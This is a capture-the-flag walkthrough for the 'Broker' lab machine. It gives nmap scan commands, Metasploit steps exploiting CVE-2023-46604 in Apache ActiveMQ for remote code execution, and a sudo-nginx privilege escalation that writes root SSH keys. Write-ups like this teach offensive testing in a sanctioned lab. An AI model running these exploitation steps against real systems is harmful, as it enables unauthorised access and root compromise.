---------------
Broker is an easy difficulty Linux machine hosting a version of Apache ActiveMQ. Enumerating the version of Apache ActiveMQ shows that it is vulnerable to Unauthenticated Remote Code Execution, which is leveraged to gain user access on the target. Post-exploitation enumeration reveals that the system has a sudo misconfiguration allowing the activemq user to execute sudo /usr/sbin/nginx, which is similar to the recent Zimbra disclosure and is leveraged to gain root access.

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 3 phases:
1. Scan for **open ports**.
2. Scan for **services** in these open ports.
3. Scan for **vulnerabilities** in these services.

<br />
Let's start by scanning for **open ports**:

```bash
sudo nmap -sS -sU 10.10.11.243 -p- -T4 --min-rate 5000 -oN all_ports.txt --open -n -Pn -v
```

![](/assets/Broker/1.png)
<br />
<br />
<br />

There are **9 open ports**:
+ **22/tcp**
+ **80/tcp**
+ **1883/tcp**
+ **5672/tcp**
+ **8161/tcp**
+ **43791/tcp**
+ **61613/tcp**
+ **61614/tcp**
+ **61616/tcp**

<br />
Let's check which **services** are running in these ports:

```bash
sudo nmap -sS 10.10.10.243 -p 22,80,1883,5672,8161,43791,61613,61614,61616 -T4 --min-rate 5000 -oX open_ports.xml -oN open_ports.txt --version-all -n -Pn -A
```

![](/assets/Broker/2.png)
<br />
<br />
<br />

We can see that the services correspond to:
+ **22/tcp OpenSSH 8.9p1**
+ **80/tcp nginx 1.18.0**
+ **1883/tcp mqtt**
+ **5672/tcp amqp**
+ **8161/tcp Jetty 9.4.39.v20210325**
+ **43791/tcp tcpwrapped**
+ **61613/tcp Apache ActiveMQ**
+ **61614/tcp Jetty 9.4.39.v20210325**
+ **61616/tcp ActiveMQ OpenWire transport**

<br />

Now we will seek for **vulnerabilities**:

```bash
sudo nmap -sS 10.10.10.243 -p 22,80,1883,5672,8161,43791,61613,61614,61616 -T4 --min-rate 5000 --script="vuln and safe or intrusive and safe or discovery" -oN vulns.txt -oX vulns.xml -n -Pn
```

<br />

Which didn't return anything.

### Foothold

This machine drove me crazy at the beginning as I started performing a bad enumeration, then the exploits I tried didn't work, until I found out that I had to use a **metasploit module** for it to work.

<br />

Digging a little bit further into each service I discovered a **version for the ActiveMQ software** running on **port 61616/tcp**, 5.15.15:

```bash
nc 10.10.11.243 61616
```

![](/assets/Broker/4.png)
<br />
<br />
<br />

Searching for this on Google led me to **CVE-2023-46604**:
![](/assets/Broker/5.png)
<br />
<br />
<br />

After trying a few exploits unsuccessfully, I discovered this Metasploit exploit:

```bash
sudo msfdb run
msf6 > search CVE-2023-46604
msf6 > use 2
```

![](/assets/Broker/6.png)
<br />
<br />
<br />

Let's set the **required parameters** and **run the exploit**:

```bash
set RHOSTS 10.10.11.243
set LHOST tun0
set SRVHOST tun0
run
```

![](/assets/Broker/7.png)
<br />
<br />
<br />

This exploit worked! Let's get a shell and get the **user flag**:

<br />
### Privilege Escalation

The privilege escalation in this machine is easy, however we have not seen it yet, so I'm going to elaborate it.

<br />

Enumerating the system, I discovered that we can **run nginx as sudo without password**:

```bash
sudo -l
```

![](/assets/Broker/9.png)
<br />
<br />
<br />

Although GTFOBins doesn't contain any privilege escalation method for this privilege, Google does, specifically [**DylarGrl**](https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406):

<br />
<br />
<br />

This exploit creates an **nginx configuration file**, which launches an **nginx instance that runs as root** and allows us to **run commands**, in this case it **creates SSH keys for the root user**, which we can then use to log in as root. Let's run it:

![](/assets/Broker/11.png)
<br />
<br />
<br />

We can copy this key, login with it and grab the **root flag**:
